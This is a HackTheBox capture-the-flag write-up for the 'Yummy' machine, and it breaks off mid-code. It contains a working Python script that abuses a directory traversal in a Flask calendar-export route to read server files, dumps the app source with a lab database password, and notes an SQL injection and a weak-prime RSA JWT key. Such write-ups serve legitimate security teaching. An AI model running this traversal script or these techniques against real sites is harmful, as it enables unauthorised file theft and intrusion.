---
title: HTB: Yummy
url: https://0xdf.gitlab.io/2025/02/22/htb-yummy.html
date: 2025-02-22T14:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: ctf, hackthebox, htb-yummy, nmap, ics-py, jwt, rsa, crypto, feroxbuster, burp, burp-repeater, directory-traversal, file-read, youtube, python, python-cmd, sagemath, rsactftool, jwt-tool, sqlmap, mercurial, diff, hg, hg-hooks, murcurial-hooks, rsync, flask, mysql-secure-file-priv, apparmor
---

![Yummy](/img/yummy-cover.png)

Yummy starts with a website for booking restaurant reserversations. I’ll abuse a directory traversal vulnerability in the functionality that creates calendar invite files to read files from the host, getting access to the source for the website as well as the crons that are running. I’ll crack the RSA used for the JWT cookie signing to get admin access, and abuse a SQL injection to write a script that will be executed by the crons. I’ll abuse another cron to get access as www-data. This user has access to a Mercurial repo (similar to Git), where I’ll find another users credentials in past commits. As the next user, I can write a Mercurial hook to pivot again. This user can execute rsync as root, which I’ll abuse to complete the box. In Beyond Root, I’ll look at the Python source for the site and why it behaves the way it does, and the misconfigurations that were enabled to allow file writing as MySQL, including MySQL configurations and AppArmor.

## Box Info

| Name | [Yummy](https://hackthebox.com/machines/yummy)  [Yummy](https://hackthebox.com/machines/yummy) [Play on HackTheBox](https://hackthebox.com/machines/yummy) |
| --- | --- |
| Release Date | [05 Oct 2024](https://twitter.com/hackthebox_eu/status/1841870855271252081) |
| Retire Date | 22 Feb 2025 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Yummy |
| Radar Graph | Radar chart for Yummy |
| First Blood User | 02:42:24[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| First Blood Root | 03:07:02[xct xct](https://app.hackthebox.com/users/13569) |
| Creator | [LazyTitan33 LazyTitan33](https://app.hackthebox.com/users/512308) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.36
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-07 17:51 EDT
Nmap scan report for 10.10.11.36
Host is up (0.085s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.84 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.36
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-07 17:51 EDT
Nmap scan report for 10.10.11.36
Host is up (0.085s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a2:ed:65:77:e9:c4:2f:13:49:19:b0:b8:09:eb:56:36 (ECDSA)
|_  256 bc:df:25:35:5c:97:24:f2:69:b4:ce:60:17:50:3c:f0 (ED25519)
80/tcp open  http    Caddy httpd
|_http-server-header: Caddy
|_http-title: Did not follow redirect to http://yummy.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.49 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 24.04 noble. The webserver is [Caddy](https://caddyserver.com/).

There’s a redirect on 80 to `yummy.htb`. I’ll use `ffuf` to fuzz for any subdomains that respond differently, but not find any. I’ll add `yummy.htb` to my `/etc/hosts` file:

```
10.10.11.36 yummy.htb

```

### Website - TCP 80

#### Site

The site is a restaurant reservation site:

![image-20241007181447322](/img/image-20241007181447322.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

Most of the links are to places on the page, but there are three that go elsewhere, “Login”, “Register”, and “Dashboard” (which redirects to `/login`). There’s a “Book a Table” form in the middle that submits the data to `/book`. The “Contact Us” and “Subscribe” forms post data to `/`.

#### Authenticated

I’ll register an account at `/register`:

![image-20241007182614747](/img/image-20241007182614747.png)

Then I can login and it loads `/dashboard`, which shows an empty table:

![image-20241007182721678](/img/image-20241007182721678.png)

If I book a table with that email address, it shows in the table:

![image-20241007182817775](/img/image-20241007182817775.png)

“Save ICalendar” downloads a `.ics` file:

```

oxdf@hacky$ file Yummy_reservation_20241007_222821.ics 
Yummy_reservation_20241007_222821.ics: iCalendar calendar file

```

The metadata on the file shows it’s made by [ics.py](https://github.com/ics-py/ics-py):

```

oxdf@hacky$ exiftool Yummy_reservation_20241007_222821.ics
ExifTool Version Number         : 12.76
File Name                       : Yummy_reservation_20241007_222821.ics
Directory                       : .
File Size                       : 271 bytes
File Modification Date/Time     : 2024:10:07 18:27:46-04:00
File Access Date/Time           : 2024:10:07 18:50:15-04:00
File Inode Change Date/Time     : 2024:10:07 18:50:13-04:00
File Permissions                : -rwxrwx---
File Type                       : ICS
File Type Extension             : ics
MIME Type                       : text/calendar
VCalendar Version               : 2.0
Software                        : ics.py - http://git.io/lLljaA
Description                     : Email: 0xdf@yummy.htb.Number of People: 223.Message: test
Date Time Start                 : 2024:10:07 00:00:00Z
Summary                         : 0xdf
UID                             : d9e60219-c926-49e8-9c21-2c91d13ab7e1@d9e6.org

```

#### Tech Stack

I already noted that the server is running [Caddy](https://caddyserver.com/). The HTTP response headers don’t show much else:

```

HTTP/1.1 200 OK
Content-Length: 39296
Content-Type: text/html; charset=utf-8
Date: Mon, 07 Oct 2024 22:12:13 GMT
Server: Caddy

```

There are two cookies set by the site. The first comes to me on posting to `/book` (before being logged in):

```

HTTP/1.1 302 Found
Content-Length: 215
Content-Type: text/html; charset=utf-8
Date: Mon, 07 Oct 2024 22:23:18 GMT
Location: /#book-a-table
Server: Caddy
Set-Cookie: session=.eJwti0EKwjAQRa_ynbV4AM_hRqTIGCZNqZmpmQQppXc3BVcf3nt_o2d8sydxuj42Qu1D3kIQdzrT3VrBy2yedESRTxOv-LLDResFXSOwIrPyKFiPmpfFJq25B4it1CQFsVj-2xCsHddbYp0PdqJhH_Yf5AUw_w.ZwRfVg.bud2f5P3IxkRcplDgKKEy6sqbtw; HttpOnly; Path=/
Vary: Cookie

```

I think this one is used to pass flash messages. The second is set on logging in:

```

HTTP/1.1 200 OK
Content-Length: 819
Content-Type: application/json
Date: Mon, 07 Oct 2024 22:26:43 GMT
Server: Caddy
Set-Cookie: X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6IjB4ZGZAeXVtbXkuaHRiIiwicm9sZSI6ImN1c3RvbWVyX2VmOTE0YzNkIiwiaWF0IjoxNzI4MzQwMDAzLCJleHAiOjE3MjgzNDM2MDMsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiMTExNjg5MjAyODkwMzk4Njg0Nzg5NzY2NzU4NTA4MTM1MTAxNDMwNDU1MDU3NDU4ODgzNjY4ODAwMzcyMDkyNDg3NjA3MTI1OTU4MzQzMzU5MjYyMzA5ODU4NDI0MzA5Nzc5NjQ3MDQ3OTQxODc1MjQxMzAwNjYyOTI5NDAzMDUxMTcwMzgyMTg3NTg3NTMyMDMzODA1NDE5NjE5MjI5MjY2NDE2MTMyMDMxMTA2NzA5OTkyODYwNzc2OTE5NTIyMTU5MzMwMTQzNDg3MTQxNTc5MzM3OTU2MDc5NjgwMzcwNzM4MTY5NDA1ODk1MzA2Mjc0MDM5MjQ1MTY3NTU3OTM2NDE0MDI4NDIwOTQwOTYwNjQ4NDA4MjczMDgwNzEyMTQ2MjUwMTgzNTQyNDg1NTk0MjY1MTIzNjYxIiwiZSI6NjU1Mzd9fQ.BAQLr0aOz-hrZ-uRWcLsa7q3IQbz0tGTt_iDjJcfTkeKMuTd0JuOw56RwJ64VBzLVI3u8idGftgFENaDIlOZEaVSR-tH_Ed-VWEuA7AUBY5IrIiRCdn7A_AwXwuBEVSx_ENJhXyJkTxXU9lg3C2VjxKMwaEDVmojeItZFP9QWu2FJlY; Path=/

```

That’s a JWT using public key crypto:

```

{
    "email": "0xdf@yummy.htb",
    "role": "customer_ef914c3d",
    "iat": 1728340003,
    "exp": 1728343603,
    "jwk": {
        "kty": "RSA",
        "n": "111689202890398684789766758508135101430455057458883668800372092487607125958343359262309858424309779647047941875241300662929403051170382187587532033805419619229266416132031106709992860776919522159330143487141579337956079680370738169405895306274039245167557936414028420940960648408273080712146250183542485594265123661",
        "e": 65537
    }
}

```

Some analysis of the `n` value shows it is weak and factorable (which I will do [later](#access-admin-dashboard)), though cracking it now doesn’t change the overall path of solving the box.

The 404 page on the site matches the [default for Flask](/cheatsheets/404#flask):

![image-20241007190837659](/img/image-20241007190837659.png)

The stack is likely a Python Flask server sitting behind Caddy.

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@hacky$ feroxbuster -u http://yummy.htb --dont-extract-links

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://yummy.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      175l      503w     7816c http://yummy.htb/register
200      GET      164l      431w     6893c http://yummy.htb/login
302      GET        5l       22w      199c http://yummy.htb/logout => http://yummy.htb/login
200      GET      902l     2875w    39296c http://yummy.htb/
200      GET      902l     2875w    39296c http://yummy.htb/book
302      GET        5l       22w      199c http://yummy.htb/dashboard => http://yummy.htb/login
[####################] - 71s    30000/30000   0s      found:6       errors:0
[####################] - 70s    30000/30000   427/s   http://yummy.htb/   

```

I’m using `--dont-extract-links` because otherwise it’s very noisy with things I don’t care about here. Nothing new here.

## Shell as mysql

### File Read

#### Requests Pattern

When I download the ICalendar file, it actually generates two HTTP requests:

![image-20241008175846614](/img/image-20241008175846614.png)

The first is to the reminder which returns a 302 redirect to the second. The second does to `/export` with what looks like a filename in the path.

If I download the same reminder again, the first URL is the same, but the second is different:

![image-20241008175918476](/img/image-20241008175918476.png)

This implies that the file is generated on the first request, and then the redirect is sent the second URL where it is downloaded.

#### Replay /export

My initial reaction is to replay the `/export` request with a different file. I’ll send that request to repeater and try editing the filename. Whatever I send returns a 500 Internal Server Error. In fact, when I send the request for the legit `.ics` file I just downloaded, it fails too:

![image-20241008210430452](/img/image-20241008210430452.png)

It seems that the first request to `/reminder` enables the next request to `/export` only once (I’ll show why in [Beyond Root](#vulnerable-python-code)).

#### Directory Traversal

To test this, I’ll turn on intercept in Burp Proxy and download the file. The first request that comes through is the GET to `/reminder/21`. I’ll forward that unmodified.

Immediately after, there’s a request for the `.ics` file:

![image-20241008210612401](/img/image-20241008210612401.png)

I’ll change the path to something with a directory traversal payload. On forwarding, I can check the HTTP history tab to see the modified request and response:

![image-20241008210741560](/img/image-20241008210741560.png)

It worked. I am able to read `/etc/passwd`. If I try to send that same request again, it returns 500. This is extremely weird, but something I can work around.

#### Script

Given the amount of work required to read a single file, I’ll write a Python script to make enumeration of files easy in [this video](https://www.youtube.com/watch?v=yKtFy0WISaA):

The final script is:

```

import re
import requests
from cmd import Cmd

base_url = 'http://yummy.htb'

class Term(Cmd):

    prompt = "yummy> "

    def __init__(self):
        super().__init__()
        self.sess = requests.session()
        self.login()
        self.booking_id = self.get_booking_id()

    def login(self):
        login_data = {"email":"0xdf@yummy.htb","password":"0xdf0xdf!"}
        resp = self.sess.post(f'{base_url}/register', json=login_data)
        resp = self.sess.post(f'{base_url}/login', json=login_data)
        resp.raise_for_status()

    def get_booking_id(self):
        book_data = {
            "name": "0xdf",
            "email": "0xdf@yummy.htb",
            "phone": "1111111111",
            "date": "2025-02-18",
            "time": "12:52",
            "people": "100",
            "message": ""
        }
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        resp = self.sess.post(f'{base_url}/book', data=book_data, headers=headers)
        resp.raise_for_status()

        resp = self.sess.get(f'{base_url}/dashboard')
        resp.raise_for_status()
        return re.findall(r'\/reminder\/(\d+)', resp.text)[0]

    def do_exit(self, args):
        return 1 # return and exit
    
    def do_EOF(self, args):
        print()
        return 1 # return and exit
    
    def get_file(self, fn):
        resp = self.sess.get(f'{base_url}/reminder/{self.booking_id}', allow_redirects=False)
        if not resp.headers["location"].startswith("/export/"):
            self.login()
            self.booking_id = self.get_booking_id()
            self.get_file(fn)
            return 0 # end without exit

        url = f'{base_url}/export/../../../../../../{fn}'
        headers = {"Cookie": '; '.join([f'{k}={v}' for k, v in self.sess.cookies.get_dict().items()])}
        req = requests.Request(method="GET", url=url, headers=headers)
        prep_req = req.prepare()
        prep_req.url = url
        resp = self.sess.send(prep_req, verify=False, allow_redirects=False)
        if resp.status_code == 200:
            return resp.content
        elif resp.status_code == 500:
            print(f'Access Denied: {fn}')
        elif resp.status_code == 404:
            print(f'File Not Found: {fn}')
        else:
            print(f'Unexpected response code for {fn}: {resp}')
        return None
    
    def default(self, args):
        if contents := self.get_file(args):
            print(contents.decode())

    def do_save(self, args):
        '''save <file path> <outfile>'''
        fn, outfile = args.split(' ')
        if contents := self.get_file(fn):
            with open(outfile, 'wb') as f:
                f.write(contents)

term = Term()
try:
    term.cmdloop()
except KeyboardInterrupt:
    print()

```

Running it drops into a shell that takes a file path, prints the result, and then re-prompts:

```

yummy> /etc/hostname
yummy
yummy> /etc/hosts
127.0.0.1 localhost yummy yummy.htb
127.0.1.1 yummy

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
yummy>

```

### Crons

#### crontab

There’s not a ton to look at on the filesystem. My first instinct is to find the web application source code, which I’ll show below. There is another bit I need to find to proceed, which is the `crontab` file:

```

yummy> /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
*/1 * * * * www-data /bin/bash /data/scripts/app_backup.sh
*/15 * * * * mysql /bin/bash /data/scripts/table_cleanup.sh
* * * * * mysql /bin/bash /data/scripts/dbmonitor.sh

```

In addition to the standard cronts to manage running fixed frequency crons, there are three scripts running from `/data/scripts`.

#### scripts

`app_backup.sh` is creating a backup of the web directory:

```

#!/bin/bash

cd /var/www
/usr/bin/rm backupapp.zip
/usr/bin/zip -r backupapp.zip /opt/app

```

`table_cleanup.sh` is what’s clearing my account every 15 minutes:

```

#!/bin/sh

/usr/bin/mysql -h localhost -u chef yummy_db -p'3wDo7gSRZIwIHRxZ!' < /data/scripts/sqlappointments.sql

```

`dbmonitor.sh` is the most interesting:

```

#!/bin/bash

timestamp=$(/usr/bin/date)
service=mysql
response=$(/usr/bin/systemctl is-active mysql)

if [ "$response" != 'active' ]; then
    /usr/bin/echo "{\"status\": \"The database is down\", \"time\": \"$timestamp\"}" > /data/scripts/dbstatus.json
    /usr/bin/echo "$service is down, restarting!!!" | /usr/bin/mail -s "$service is down!!!" root
    latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
    /bin/bash "$latest_version"
else
    if [ -f /data/scripts/dbstatus.json ]; then
        if grep -q "database is down" /data/scripts/dbstatus.json 2>/dev/null; then
            /usr/bin/echo "The database was down at $timestamp. Sending notification."
            /usr/bin/echo "$service was down at $timestamp but came back up." | /usr/bin/mail -s "$service was down!" root
            /usr/bin/rm -f /data/scripts/dbstatus.json
        else
            /usr/bin/rm -f /data/scripts/dbstatus.json
            /usr/bin/echo "The automation failed in some way, attempting to fix it."
            latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
            /bin/bash "$latest_version"
        fi
    else
        /usr/bin/echo "Response is OK."
    fi
fi

[ -f dbstatus.json ] && /usr/bin/rm -f dbstatus.json

```

This script checks if the database is up. If not, it writes to a log and tries to run the most recently updated script at `/data/scripts/fixer-v*`. and emails the admin. It also checks if `/data/script/dbstatus.json` exits, and if so takes the same actions.

If I can write a file in this directory, what I write will be executed by the mysql user from the cron.

### Site Source

#### app.py

Because I’m reading files through the Flask application, the current working directory will be `/proc/self/cwd`. I can reasonably guess that the application will start in `app.py`, and get the source to the site at `/proc/self/cwd/app.py`. Alternatively, I can download `/var/www/backupapp.zip` using the file read vuln and get all the source from there.

`app.py` is:

```

from flask import Flask, request, send_file, render_template, redirect, url_for, flash, jsonify, make_response
import tempfile
import os
import shutil
from datetime import datetime, timedelta, timezone
from urllib.parse import quote
from ics import Calendar, Event
from middleware.verification import verify_token
from config import signature
import pymysql.cursors
from pymysql.constants import CLIENT
import jwt
import secrets
import hashlib

app = Flask(__name__, static_url_path='/static')
temp_dir = ''
app.secret_key = secrets.token_hex(32)

db_config = {
    'host': '127.0.0.1',
    'user': 'chef',
    'password': '3wDo7gSRZIwIHRxZ!',
    'database': 'yummy_db',
    'cursorclass': pymysql.cursors.DictCursor,
    'client_flag': CLIENT.MULTI_STATEMENTS

}

access_token = ''

@app.route('/login', methods=['GET','POST'])
def login():
    global access_token
    if request.method == 'GET':
        return render_template('login.html', message=None)
    elif request.method == 'POST':
        email = request.json.get('email')
        password = request.json.get('password')
        password2 = hashlib.sha256(password.encode()).hexdigest()
        if not email or not password:
            return jsonify(message="email or password is missing"), 400

        connection = pymysql.connect(**db_config)
        try:
            with connection.cursor() as cursor:
                sql = "SELECT * FROM users WHERE email=%s AND password=%s"
                cursor.execute(sql, (email, password2))
                user = cursor.fetchone()
                if user:
                    payload = {
                        'email': email,
                        'role': user['role_id'],
                        'iat': datetime.now(timezone.utc),
                        'exp': datetime.now(timezone.utc) + timedelta(seconds=3600),
                        'jwk':{'kty': 'RSA',"n":str(signature.n),"e":signature.e}
                    }
                    access_token = jwt.encode(payload, signature.key.export_key(), algorithm='RS256')

                    response = make_response(jsonify(access_token=access_token), 200)
                    response.set_cookie('X-AUTH-Token', access_token)
                    return response
                else:
                    return jsonify(message="Invalid email or password"), 401
        finally:
            connection.close()

@app.route('/logout', methods=['GET'])
def logout():
    response = make_response(redirect('/login'))
    response.set_cookie('X-AUTH-Token', '')
    return response

@app.route('/register', methods=['GET', 'POST'])
def register():
        if request.method == 'GET':
            return render_template('register.html', message=None)
        elif request.method == 'POST':
            role_id = 'customer_' + secrets.token_hex(4)
            email = request.json.get('email')
            password = hashlib.sha256(request.json.get('password').encode()).hexdigest()
            if not email or not password:
                return jsonify(error="email or password is missing"), 400
            connection = pymysql.connect(**db_config)
            try:
                with connection.cursor() as cursor:
                    sql = "SELECT * FROM users WHERE email=%s"
                    cursor.execute(sql, (email,))
                    existing_user = cursor.fetchone()
                    if existing_user:
                        return jsonify(error="Email already exists"), 400
                    else:
                        sql = "INSERT INTO users (email, password, role_id) VALUES (%s, %s, %s)"
                        cursor.execute(sql, (email, password, role_id))
                        connection.commit()
                        return jsonify(message="User registered successfully"), 201
            finally:
                connection.close()

@app.route('/', methods=['GET', 'POST'])
def index():
    return render_template('index.html')

@app.route('/book', methods=['GET', 'POST'])
def export():
    if request.method == 'POST':
        try:
            name = request.form['name']
            date = request.form['date']
            time = request.form['time']
            email = request.form['email']
            num_people = request.form['people']
            message = request.form['message']

            connection = pymysql.connect(**db_config)
            try:
                with connection.cursor() as cursor:
                    sql = "INSERT INTO appointments (appointment_name, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message, role_id) VALUES (%s, %s, %s, %s, %s, %s, %s)"
                    cursor.execute(sql, (name, email, date, time, num_people, message, 'customer'))
                    connection.commit()
                    flash('Your booking request was sent. You can manage your appointment further from your account. Thank you!', 'success')  
            except Exception as e:
                print(e)
            return redirect('/#book-a-table')
        except ValueError:
            flash('Error processing your request. Please try again.', 'error')
    return render_template('index.html')

def generate_ics_file(name, date, time, email, num_people, message):
    global temp_dir
    temp_dir = tempfile.mkdtemp()
    current_date_time = datetime.now()
    formatted_date_time = current_date_time.strftime("%Y%m%d_%H%M%S")

    cal = Calendar()
    event = Event()
    
    event.name = name
    event.begin = datetime.strptime(date, "%Y-%m-%d")
    event.description = f"Email: {email}\nNumber of People: {num_people}\nMessage: {message}"
    
    cal.events.add(event)

    temp_file_path = os.path.join(temp_dir, quote('Yummy_reservation_' + formatted_date_time + '.ics'))
    with open(temp_file_path, 'w') as fp:
        fp.write(cal.serialize())

    return os.path.basename(temp_file_path)

@app.route('/export/<path:filename>')
def export_file(filename):
    validation = validate_login()
    if validation is None:
        return redirect(url_for('login'))
    filepath = os.path.join(temp_dir, filename)
    if os.path.exists(filepath):
        content = send_file(filepath, as_attachment=True)
        shutil.rmtree(temp_dir)
        return content
    else:
        shutil.rmtree(temp_dir)
        return "File not found", 404

def validate_login():
    try:
        (email, current_role), status_code = verify_token()
        if email and status_code == 200 and current_role == "administrator":
            return current_role
        elif email and status_code == 200:
            return email
        else:
            raise Exception("Invalid token")
    except Exception as e:
        return None

@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
        validation = validate_login()
        if validation is None:
            return redirect(url_for('login'))
        elif validation == "administrator":
            return redirect(url_for('admindashboard'))
 
        connection = pymysql.connect(**db_config)
        try:
            with connection.cursor() as cursor:
                sql = "SELECT appointment_id, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message FROM appointments WHERE appointment_email = %s"
                cursor.execute(sql, (validation,))
                connection.commit()
                appointments = cursor.fetchall()
                appointments_sorted = sorted(appointments, key=lambda x: x['appointment_id'])

        finally:
            connection.close()

        return render_template('dashboard.html', appointments=appointments_sorted)

@app.route('/delete/<appointID>')
def delete_file(appointID):
    validation = validate_login()
    if validation is None:
        return redirect(url_for('login'))
    elif validation == "administrator":
        connection = pymysql.connect(**db_config)
        try:
            with connection.cursor() as cursor:
                sql = "DELETE FROM appointments where appointment_id= %s;"
                cursor.execute(sql, (appointID,))
                connection.commit()

                sql = "SELECT * from appointments"
                cursor.execute(sql)
                connection.commit()
                appointments = cursor.fetchall()
        finally:
            connection.close()
            flash("Reservation deleted successfully","success")
            return redirect(url_for("admindashboard"))
    else:
        connection = pymysql.connect(**db_config)
        try:
            with connection.cursor() as cursor:
                sql = "DELETE FROM appointments WHERE appointment_id = %s AND appointment_email = %s;"
                cursor.execute(sql, (appointID, validation))
                connection.commit()

                sql = "SELECT appointment_id, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message FROM appointments WHERE appointment_email = %s"
                cursor.execute(sql, (validation,))
                connection.commit()
                appointments = cursor.fetchall()
        finally:
            connection.close()
            flash("Reservation deleted successfully","success")
            return redirect(url_for("dashboard"))
        flash("Something went wrong!","error")
        return redirect(url_for("dashboard"))

@app.route('/reminder/<appointID>')
def reminder_file(appointID):
    validation = validate_login()
    if validation is None:
        return redirect(url_for('login'))

    connection = pymysql.connect(**db_config)
    try:
        with connection.cursor() as cursor:
            sql = "SELECT appointment_id, appointment_name, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message FROM appointments WHERE appointment_email = %s AND appointment_id = %s"
            result = cursor.execute(sql, (validation, appointID))
            if result != 0:
                connection.commit()
                appointments = cursor.fetchone()
                filename = generate_ics_file(appointments['appointment_name'], appointments['appointment_date'], appointments['appointment_time'], appointments['appointment_email'], appointments['appointment_people'], appointments['appointment_message'])
                connection.close()
                flash("Reservation downloaded successfully","success")
                return redirect(url_for('export_file', filename=filename))
            else:
                flash("Something went wrong!","error")
    except:
        flash("Something went wrong!","error")
        
    return redirect(url_for("dashboard"))

@app.route('/admindashboard', methods=['GET', 'POST'])
def admindashboard():
        validation = validate_login()
        if validation != "administrator":
            return redirect(url_for('login'))
 
        try:
            connection = pymysql.connect(**db_config)
            with connection.cursor() as cursor:
                sql = "SELECT * from appointments"
                cursor.execute(sql)
                connection.commit()
                appointments = cursor.fetchall()

                search_query = request.args.get('s', '')

                # added option to order the reservations
                order_query = request.args.get('o', '')

                sql = f"SELECT * FROM appointments WHERE appointment_email LIKE %s order by appointment_date {order_query}"
                cursor.execute(sql, ('%' + search_query + '%',))
                connection.commit()
                appointments = cursor.fetchall()
            connection.close()
            
            return render_template('admindashboard.html', appointments=appointments)
        except Exception as e:
            flash(str(e), 'error')
            return render_template('admindashboard.html', appointments=appointments)

if __name__ == '__main__':
    app.run(threaded=True, debug=False, host='0.0.0.0', port=3000)

```

Most of this is about what I would have expected. I’ll go over some of the oddities of the Python and why the exploit works the way it does in [Beyond Root](#vulnerable-python-code). To move forward exploiting the box, I’ll note a new path I hadn’t found before, `/admindashboard` (though trying to visit `/dashboard` as an admin will also find this). At the top of the function, it makes sure there’s some admin privilege:

```

@app.route('/admindashboard', methods=['GET', 'POST'])
def admindashboard():
        validation = validate_login()
        if validation != "administrator":
            return redirect(url_for('login'))

```

This is also an unusual way to do login. Typically this would be done with a decorator.

Later, this route uses strings with user input to build a query, which is very likely vulnerable to SQL injection:

```

            # added option to order the reservations
            order_query = request.args.get('o', '')

            sql = f"SELECT * FROM appointments WHERE appointment_email LIKE %s order by appointment_date {order_query}"
            cursor.execute(sql, ('%' + search_query + '%',))
            connection.commit()
            appointments = cursor.fetchall()

```

I’ll need to figure out how to get past the validation check. `validate_login` is defined at the top of the file:

```

def validate_login():
    try:
        (email, current_role), status_code = verify_token()
        if email and status_code == 200 and current_role == "administrator":
            return current_role
        elif email and status_code == 200:
            return email
        else:
            raise Exception("Invalid token")
    except Exception as e:
        return None

```

This is basically calling `verify_token`, which is imported at the top of the file:

```

from middleware.verification import verify_token

```

That is a function `verify_token` in the file `middleware/verification.py`.

#### verification.py

This file is much shorter:

```

#!/usr/bin/python3

from flask import request, jsonify
import jwt
from config import signature

def verify_token():
    token = None
    if "Cookie" in request.headers:
        try:
            token = request.headers["Cookie"].split(" ")[0].split("X-AUTH-Token=")[1].replace(";", '')
        except:
            return jsonify(message="Authentication Token is missing"), 401

    if not token:
        return jsonify(message="Authentication Token is missing"), 401

    try:
        data = jwt.decode(token, signature.public_key, algorithms=["RS256"])
        current_role = data.get("role")
        email = data.get("email")
        if current_role is None or ("customer" not in current_role and "administrator" not in current_role):
            return jsonify(message="Invalid Authentication token"), 401

        return (email, current_role), 200

    except jwt.ExpiredSignatureError:
        return jsonify(message="Token has expired"), 401
    except jwt.InvalidTokenError:
        return jsonify(message="Invalid token"), 401
    except Exception as e:
        return jsonify(error=str(e)), 500

```

It gets the cookie and uses `jwt.decode` with the public key of `signature.public_key` to validate it. `signature` comes from `from config import signature`, which suggests a `config/signature.py` (it could also be `config.py` with a `signature` class that has a `public_key` attribute, but that seems less likely).

#### signature.py

This file contains the cryptographic key generation:

```

#!/usr/bin/python3

from Crypto.PublicKey import RSA
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import sympy

# Generate RSA key pair
q = sympy.randprime(2**19, 2**20)
n = sympy.randprime(2**1023, 2**1024) * q
e = 65537
p = n // q
phi_n = (p - 1) * (q - 1)
d = pow(e, -1, phi_n)
key_data = {'n': n, 'e': e, 'd': d, 'p': p, 'q': q}
key = RSA.construct((key_data['n'], key_data['e'], key_data['d'], key_data['p'], key_data['q']))
private_key_bytes = key.export_key()

private_key = serialization.load_pem_private_key(
    private_key_bytes,
    password=None,
    backend=default_backend()
)
public_key = private_key.public_key()

```

It’s generating an RSA key by picking a `q` that’s between 2^19 and 2^20, and then a `p` (implicitly defined as `n = q * p`) between 2^1023 and 2^1024.

### Access Admin Dashboard

#### Generate Key Pair

That `q` is suspiciously small. I noticed [above](#tech-stack) that the JWT decoded to include the `n` value:

```

>>> import jwt
